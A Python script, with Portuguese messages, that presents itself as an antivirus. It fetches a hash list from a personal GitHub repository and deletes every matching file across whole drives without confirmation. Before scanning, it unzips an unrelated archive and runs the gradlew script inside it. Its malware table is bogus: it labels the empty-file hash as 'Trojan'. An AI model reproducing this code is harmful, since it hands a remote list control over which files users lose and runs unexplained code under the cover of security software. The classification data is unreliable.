#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import hashlib
import requests
import platform
import subprocess
import zipfile
import quarentena
from prettytable import PrettyTable

notification_log = []

def safe_clear():
    if sys.stdout.isatty():
        os.system('cls' if os.name == 'nt' else 'clear')

def calculate_hashes(file_path):
    hasher_md5 = hashlib.md5()
    hasher_sha1 = hashlib.sha1()
    hasher_sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as file:
            buf = file.read(65536)
            while buf:
                hasher_md5.update(buf)
                hasher_sha1.update(buf)
                hasher_sha256.update(buf)
                buf = file.read(65536)
    except (FileNotFoundError, PermissionError, OSError):
        return None
    return hasher_md5.hexdigest(), hasher_sha1.hexdigest(), hasher_sha256.hexdigest()

def classify_malware(file_hashes, malware_classification):
    for hash_value in file_hashes:
        if hash_value in malware_classification:
            return malware_classification[hash_value]
    return "Unknown"

def send_notification(message):
    notification_log.append(message)
    print(f"Notificação: {message}")

def delete_file(file_path):
    try:
        os.remove(file_path)
        send_notification(f"Arquivo deletado: {file_path}")
    except Exception as e:
        send_notification(f"Erro ao tentar excluir o arquivo {file_path}: {str(e)}")

def scan_file(file_path, malicious_hashes, malware_classification, table):
    file_hashes = calculate_hashes(file_path)
    if file_hashes is None:
        return
    for hash_value in file_hashes:
        if hash_value in malicious_hashes:
            malware_type = classify_malware(file_hashes, malware_classification)
            table.add_row([file_path, malware_type])
            send_notification(f"Ameaça detectada: {file_path} - {malware_type}")
            delete_file(file_path)
            safe_clear()
            print(table)
            break

def scan_directory(directory, malicious_hashes, malware_classification, counter, table):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                scan_file(file_path, malicious_hashes, malware_classification, table)
                counter[0] += 1
            except (PermissionError, OSError):
                pass
            except KeyboardInterrupt:
                raise
    return counter

def fetch_hashes_fallback(url):
    try:
        result = subprocess.run(["curl", "-s", url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return set(result.stdout.decode().splitlines())
    except Exception as e:
        print("Erro ao usar fallback com curl:", e)
    return set()

def unzip_antivirus_file(zip_path, extract_to):
    try:
        full_extract_path = os.path.join(extract_to, "JarkiOpsis")
        os.makedirs(full_extract_path, exist_ok=True)
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(full_extract_path)
        send_notification(f"Arquivo {zip_path} extraído em {full_extract_path}")

        gradlew_path = os.path.join(full_extract_path, "./gradlew")
        if os.path.exists(gradlew_path):
            os.chmod(gradlew_path, 0o755)
            subprocess.run([gradlew_path], cwd=full_extract_path)
            send_notification("Script gradlew executado com sucesso.")
        else:
            send_notification(f"'gradlew' não encontrado em {full_extract_path}")
    except Exception as e:
        send_notification(f"Erro ao extrair ou executar gradlew: {str(e)}")

if __name__ == "__main__":
    print("Iniciando antivírus...")
    url = "https://raw.githubusercontent.com/RAFAEL849412/Sat-lite/refs/heads/main/hashes.txt"
    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        malicious_hashes = set(response.text.splitlines())
    except Exception as e:
        print(f"Erro com requests, tentando fallback com curl: {e}")
        malicious_hashes = fetch_hashes_fallback(url)

    malware_classification = {
        "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8": "Ransomware",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": "Trojan",
        "8754c2a98e3b9c86aa49d4a35b8835e5fc6d5e6f53d6bce44a7f8db9c524de7a": "Virus",
        "3dc3c3f1bce75e029b1c7a8db9a20dfb2c6f68c925b1898db0d49f7a1d0520a6": "Spyware",
        "d301f9c47a8dd8331c4597feefcb056d08e3a3b4c4f4d03f9c1436a1a5f5b6b5": "Adware",
        "1e8a9f5127d527fb9c97d7fd8be2b883cc7f75e20e437d7b19db69b42c42220c": "Worm"
    }

    if platform.system() == 'Windows':
        directories_to_scan = ["C:\\", "D:\\", "E:\\"]
    elif platform.system() == 'Linux':
        directories_to_scan = ["/sdcard", "/data/data/com.termux/files/home"]
    else:
        print("Sistema operacional não suportado.")
        directories_to_scan = []

    zip_file_path = "JarkiOpsis.zip"
    extract_to_dir = "/tmp"

    unzip_antivirus_file(zip_file_path, extract_to_dir)

    start_time = time.time()
    counter = [0]

    table = PrettyTable()
    table.field_names = ["Caminho do Arquivo", "Tipo de Ameaça"]

    try:
        for directory in directories_to_scan:
            counter = scan_directory(directory, malicious_hashes, malware_classification, counter, table)
    except KeyboardInterrupt:
        print("O programa foi interrompido pelo usuário")

    end_time = time.time()
    elapsed_time = end_time - start_time

    safe_clear()
    print(table)
    print(f"\nTotal de arquivos verificados: {counter[0]}")
    print(f"Tempo de execução: {elapsed_time:.2f} segundos")
    print("Esse antivírus foi desenvolvido por Halil Deniz. Em caso de dúvidas, entre em contato.")
    print("\nRegistro de notificações enviadas:")
    for notification in notification_log:
        print(notification)
